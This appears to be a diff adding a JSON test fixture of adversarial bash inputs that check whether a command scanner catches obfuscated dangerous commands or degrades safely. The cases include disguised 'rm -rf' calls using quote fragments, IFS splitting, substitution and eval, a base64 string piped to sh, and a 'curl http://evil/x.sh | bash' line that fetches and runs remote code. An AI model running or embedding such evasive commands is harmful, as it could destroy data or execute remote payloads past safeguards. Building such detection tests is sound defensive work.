@@ -1,0 +1,26 @@
+{
+  "name": "guardfall-bash",
+  "description": "GuardFall classes A-E for bash: adversarial inputs that evade a surface-level scanner. Every case must be classified as 'effect present or top' (no silent misses).",
+  "cases": [
+    { "id": "gf-bash-a-quote-sq",   "group": "guardfall", "category": "A", "lang": "bash", "input": "r''m -rf /tmp/x",            "note": "empty single-quote fragment inside the command name" },
+    { "id": "gf-bash-a-quote-dq",   "group": "guardfall", "category": "A", "lang": "bash", "input": "\"r\"m -rf /tmp/x",          "note": "double-quote fragment inside the command name" },
+    { "id": "gf-bash-a-escape",     "group": "guardfall", "category": "A", "lang": "bash", "input": "\\rm -rf /tmp/x",            "note": "backslash-escaped first letter" },
+    { "id": "gf-bash-b-ifs",        "group": "guardfall", "category": "B", "lang": "bash", "input": "rm$IFS-rf$IFS/tmp/x",        "note": "word splitting via the default IFS" },
+    { "id": "gf-bash-b-ifs-brace",  "group": "guardfall", "category": "B", "lang": "bash", "input": "rm${IFS}-rf${IFS}/tmp/x",    "note": "braced IFS expansion" },
+    { "id": "gf-bash-c-subst",      "group": "guardfall", "category": "C", "lang": "bash", "input": "$(echo rm) -rf /tmp/x",      "note": "command substitution yielding the program name" },
+    { "id": "gf-bash-c-subst-arg",  "group": "guardfall", "category": "C", "lang": "bash", "input": "echo \"$(rm /tmp/x)\"",      "note": "command substitution nested inside an argument" },
+    { "id": "gf-bash-c-var",        "group": "guardfall", "category": "C", "lang": "bash", "input": "X=rm; $X -rf /tmp/x",        "note": "dynamically-named program via a variable" },
+    { "id": "gf-bash-c-backtick",   "group": "guardfall", "category": "C", "lang": "bash", "input": "`echo rm` -rf /tmp/x",       "note": "backtick command substitution" },
+    { "id": "gf-bash-d-b64-sh",     "group": "guardfall", "category": "D", "lang": "bash", "input": "echo aGVsbG8= | base64 -d | sh", "note": "encoded payload piped to an interpreter" },
+    { "id": "gf-bash-d-eval",       "group": "guardfall", "category": "D", "lang": "bash", "input": "eval \"rm -rf /tmp/x\"",     "note": "evaluating a string as code" },
+    { "id": "gf-bash-d-shc",        "group": "guardfall", "category": "D", "lang": "bash", "input": "sh -c 'rm -rf /tmp/x'",      "note": "interpreter invoked with a command string" },
+    { "id": "gf-bash-d-curl-bash",  "group": "guardfall", "category": "D", "lang": "bash", "input": "curl http://evil/x.sh | bash", "note": "remote payload piped to an interpreter" },
+    { "id": "gf-bash-e-loop",       "group": "guardfall", "category": "E", "lang": "bash", "input": "while true; do :; done",     "note": "unbounded loop: the step budget must yield top" },
+    { "id": "gf-bash-e-unknown",    "group": "guardfall", "category": "E", "lang": "bash", "input": "frobnicate --wat /y",        "note": "unknown binary: degrades to top" },
+    { "id": "gf-bash-e-dynamic",    "group": "guardfall", "category": "E", "lang": "bash", "input": "$CMD /y",                    "note": "dynamically-named program: degrades to top" },
+    { "id": "gf-bash-e-unkquote",   "group": "guardfall", "category": "E", "lang": "bash", "input": "echo \"unterminated",        "note": "C4 adversarial: unbalanced quote; the parse failure must degrade to top, not to a benign miss" },
+    { "id": "gf-bash-e-pipe-unk",   "group": "guardfall", "category": "E", "lang": "bash", "input": "frobnicate --wat /y | frobnicate --wat /z | frobnicate --wat /w", "note": "C4 adversarial: pipeline of unresolved commands; must degrade to top, not to an empty result" },
+    { "id": "gf-bash-e-nested-unk", "group": "guardfall", "category": "E", "lang": "bash", "input": "( ( ( frobnicate --wat /y ) ) )", "note": "C4 adversarial: deep nesting around an unresolved command; must stay bounded and covered" },
+    { "id": "gf-bash-e-alias-rep",  "group": "guardfall", "category": "E", "lang": "bash", "input": "alias a=b; alias a=b; alias a=b; frobnicate", "note": "C4 adversarial: repeated alias records; the record cap must bound the analysis and the unresolved command must degrade to top" }
+  ]
+}
